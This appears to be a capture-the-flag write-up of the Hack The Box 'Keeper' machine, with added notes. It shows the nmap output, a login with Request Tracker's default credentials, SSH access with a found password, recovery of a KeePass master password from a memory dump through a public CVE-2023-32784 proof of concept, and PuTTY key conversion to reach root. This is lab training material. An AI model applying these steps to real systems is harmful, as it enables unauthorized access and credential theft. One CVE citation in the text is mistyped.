#scp #SCP #kpcli #puTTY #keepass #putty #PUTTY 
### Enumeration

we found port 22 and 80 running on the target machine using the full Nmap service version and script scan.
  
┌──(kali㉿kali)-[~/Documents/HTB/Keeper]  
└─$ sudo nmap -p $ports -sVC $target                                                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 07:19 EDT  
Nmap scan report for 10.10.11.227  
Host is up (0.35s latency).  
  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)  
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  
|_http-title: Site doesn't have a title (text/html).  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds

Now, that we look at the webpage hosted on port 80, it says:

![](https://miro.medium.com/v2/resize:fit:1052/1*eReiEUwQYg_hl1SguA0Ggw.png)

let’s add this domain name to **/etc/hosts** and visit _tickets.keeper.htb/rt/_

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*m9tSSOuW6-Ke1LoyoKmDYw.png)

after a quick google search on ‘RT 4.4.4+dfsg’. It appears to be a request tracker. if we search for ‘request tracker default passwords’, we get

User: root Pass: password

## Get M1NUx’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

if we look at all the users present on this portal. **Admin > Users > Select**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*ViCdUsBFWSi5NYv-ZM59MQ.png)

if we look deeper into this “Lise Nørgaard” user, we are able to obtain the credentials for the username “lnorgaard”.

![](https://miro.medium.com/v2/resize:fit:1228/1*fnXBvJaAEl76yPsW5rezng.png)

Now, that we have the user and the password let’s try logging in SSH.

![](https://miro.medium.com/v2/resize:fit:1342/1*bLUtZBHEtau4u0Mt8fvt8w.png)

we found two files, one is our user flag and the other is a zip file.

![](https://miro.medium.com/v2/resize:fit:782/1*mqYLIMB02CAHS6qbacAeig.png)

let’s get this files into our local machine and analyse them

┌──(kali㉿kali)-[~/Documents/HTB/Keeper]  
└─$ scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .  
lnorgaard@10.10.11.227s password:   
RT30000.zip                                                100%   83MB 513.7KB/s   02:46   
  
┌──(kali㉿kali)-[~/Documents/HTB/Keeper]  
└─$ unzip RT30000.zip  
Archive:  RT30000.zip  
  inflating: KeePassDumpFull.dmp       
 extracting: passcodes.kdbx

the zip file consists of a keepass database file and a password dump file. if we google “keepass vulnerability”, We come across **CVE-2023–3278**. Here, is the Proof of Concept for this vulnerability [here](https://github.com/z-jxy/keepass_dump/tree/main).

python3 keepass_dump.py -f KeePassDumpFull.dmp --skip --debug --recover

![](https://miro.medium.com/v2/resize:fit:1262/1*MmC2fYL4GlrLrUtvB2GgbQ.png)

### Exploit: Explained

This exploit/vulnerability takes use of the weakness, which is that strings are produced in memory when the master password is entered into the KeePass application.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*jKSDmKgHEuOcynh8tJ96Cw.gif)

So, the exploit scans the memory dump for these patterns, that reveals the Master Password.

To get a deeper understanding of this vulnerability and see the POC in action. I am providing you with some resources that I found interesting.

[KeePass Master Password Exploit — CVE-2023–32784 — Proof Of Concept (POC) — Bleekseeks](https://bleekseeks.com/blog/keepass-master-password-exploit-cve-2023-32784-poc)

if we search the phrase “dgre med flde” we get this:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*3Zwnf4ae7xijgBENuiBzfg.png)

“rødgrød **med** fløde” appears to be some traditional Danish recipe, lets try this as password for the password database. For this we require a kpcli, which is a command line interface for keepass.

#installation  
sudo apt-get install kpcli -y  
  
┌──(kali㉿kali)-[~/Documents/HTB/keeper]  
└─$ kpcli  
  
KeePass CLI (kpcli) v3.8.1 is ready for operation.  
Type 'help' for a description of available commands.  
Type 'help <command>' for details on individual commands.  
  
kpcli:/> open passcodes.kdbx   
Provide the master password: *************************  
kpcli:/> ls  
=== Groups ===  
passcodes/  
kpcli:/> cd passcodes/  
kpcli:/passcodes> ls  
=== Groups ===  
eMail/  
General/  
Homebanking/  
Internet/  
Network/  
Recycle Bin/  
Windows/

now that we are able to access the password database. In the network group we found two entries, one of which contains the root user password and a ssh-rsa key in it’s notes section.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*xv9NIZXnWBszqgRPN7snLw.png)

if we use the **-f** argument to get the hidden password. Save this putty-user key in a file “ssh_key_file”. To convert this putty key to ssh-rsa key we’ll use puttygen utility for linux

puttygen ssh_key_file -O private-openssh -o id_rsa  
chmod 600 id_rsa  
ssh root@10.10.11.227 -i id_rsa

![](https://miro.medium.com/v2/resize:fit:1114/1*8DrzaMUZGrJ13kzsxLQ8ug.png)

And here we we’re able to successfully obtain the root shell and got the root flag!
### More Explanation

>[!note] Why did we use puTTY ?
>The key I found starts with **`PuTTY-User-Key-File-3`**. This is a proprietary format created for the **PuTTY** software (Windows). Your Kali machine's SSH client (**OpenSSH**) only understands its own format, which normally begins with **`-----BEGIN OPENSSH PRIVATE KEY-----`**.


>[!note] What is kpcli and Why did we use it ?
>**kpcli** is a command-line interface for KeePass database files, allowing you to manage and view your passwords directly from a Linux terminal without needing a graphical interface. It’s essentially a "shell" specifically designed to navigate the folders and entries of a `.kdbx` file using familiar commands like `ls` and `cd`.


Download ssh files into my machine : 

```
$ scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip . 
lnorgaard@keeper.htb's password: 
RT30000.zip
```